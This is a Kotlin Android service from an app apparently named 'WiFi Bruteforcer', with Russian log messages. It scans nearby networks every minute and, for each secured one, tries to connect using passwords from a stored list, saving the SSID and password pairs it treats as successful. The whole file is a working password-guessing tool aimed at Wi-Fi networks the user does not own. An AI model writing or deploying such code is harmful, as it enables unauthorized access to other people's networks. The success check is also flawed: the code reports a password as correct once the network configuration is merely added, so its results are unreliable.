package com.santaklouse.example.wifibruteforcer

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.annotation.RequiresPermission
import androidx.core.app.NotificationCompat

class WifiScanService : Service() {

    private lateinit var wifiManager: WifiManager
    private val handler = Handler(Looper.getMainLooper())
    private val scanInterval = 60000L

    private val processedNetworks = mutableSetOf<String>() // BSSID
    private val successfulNetworks = mutableMapOf<String, String>() // SSID -> пароль

    private val wifiReceiver = object : BroadcastReceiver() {
        @RequiresPermission(Manifest.permission.ACCESS_FINE_LOCATION)
        override fun onReceive(context: Context?, intent: Intent?) {
            val success = intent?.getBooleanExtra(WifiManager.EXTRA_RESULTS_UPDATED, false) ?: false
            if (success) processScanResults()
        }
    }

    override fun onCreate() {
        super.onCreate()
        wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager

        createNotificationChannel()
        startForeground(1, createNotification())

        registerReceiver(wifiReceiver, IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION))
        registerReceiver(connectionReceiver, IntentFilter(WifiManager.NETWORK_STATE_CHANGED_ACTION))


        handler.post(scanRunnable)
        sendLog("Сервис запущен (режим WifiConfiguration)")
    }

    private val scanRunnable: Runnable = Runnable {
        if (wifiManager.isWifiEnabled) {
            wifiManager.startScan()
            sendLog("Сканирование запущено")
        }
        handler.postDelayed(scanRunnable, scanInterval)
    }

    private val connectionReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val wifiInfo = wifiManager.connectionInfo
            if (wifiInfo != null && wifiInfo.networkId != -1) {
                val ssid = wifiInfo.ssid.removeSurrounding("\"")
                if (successfulNetworks.containsKey(ssid)) {
                    sendLog("Реально подключены к: $ssid")
                }
            }
        }
    }

    @RequiresPermission(allOf = [Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION])
    private fun processScanResults() {
        val results = wifiManager.scanResults ?: return
        val passwords = PasswordManager.getPasswords(this)
        val allItems = mutableListOf<NetworkItem>()

        for (result in results) {
            val ssid = result.SSID
            if (ssid.isEmpty()) continue
            val bssid = result.BSSID

            if (processedNetworks.contains(bssid)) continue
            processedNetworks.add(bssid)

            sendLog("Найдена сеть: $ssid")

            if (result.capabilities.contains("WEP") || result.capabilities.contains("WPA") || result.capabilities.contains("SAE")) {
                val password = tryConnectWithConfiguration(ssid, passwords)
                val status = if (password != null) {
                    successfulNetworks[ssid] = password
                    Status.SUCCESS
                } else Status.FAILED

                allItems.add(NetworkItem(ssid, bssid, status, result.level, password))
            } else {
                allItems.add(NetworkItem(ssid, bssid, Status.OPEN, result.level))
                sendLog("Открытая сеть: $ssid")
            }
        }

        val sortedList = allItems.sortedWith(
            compareByDescending<NetworkItem> { it.status == Status.SUCCESS }
                .thenByDescending { it.signal }
        )

        val intent = Intent("UPDATE_NETWORKS")
        intent.putParcelableArrayListExtra("networks", ArrayList(sortedList))
        sendBroadcast(intent)
    }

    private fun tryConnectWithConfiguration(ssid: String, passwords: List<String>): String? {
        for (pass in passwords) {
            try {
                val config = WifiConfiguration().apply {
                    SSID = "\"$ssid\""
                    preSharedKey = "\"$pass\""
                    allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK)
                    allowedProtocols.set(WifiConfiguration.Protocol.RSN)
                    allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP)
                }

                val networkId = wifiManager.addNetwork(config)
                if (networkId != -1) {
                    wifiManager.enableNetwork(networkId, true)
                    wifiManager.reconnect()
                    sendLog("Попытка подключения к $ssid с паролем: $pass")
                    return pass
                }
            } catch (e: Exception) {
                sendLog("Ошибка с паролем $pass для $ssid")
            }
        }
        return null
    }

    private fun sendLog(message: String) {
        val intent = Intent("LOG_UPDATE")
        intent.putExtra("log", message)
        sendBroadcast(intent)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "wifi_scan_channel",
                "WiFi Bruteforcer",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification() = NotificationCompat.Builder(this, "wifi_scan_channel")
        .setContentTitle("WiFi Bruteforcer")
        .setContentText("Попытки подключения...")
        .setSmallIcon(android.R.drawable.ic_menu_compass)
        .setPriority(NotificationCompat.PRIORITY_LOW)
        .setOngoing(true)
        .build()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler.removeCallbacks(scanRunnable)
        try { unregisterReceiver(wifiReceiver) } catch (e: Exception) {}
        try { unregisterReceiver(connectionReceiver) } catch (e: Exception) {}
        sendLog("Сервис остановлен")
        super.onDestroy()
    }
}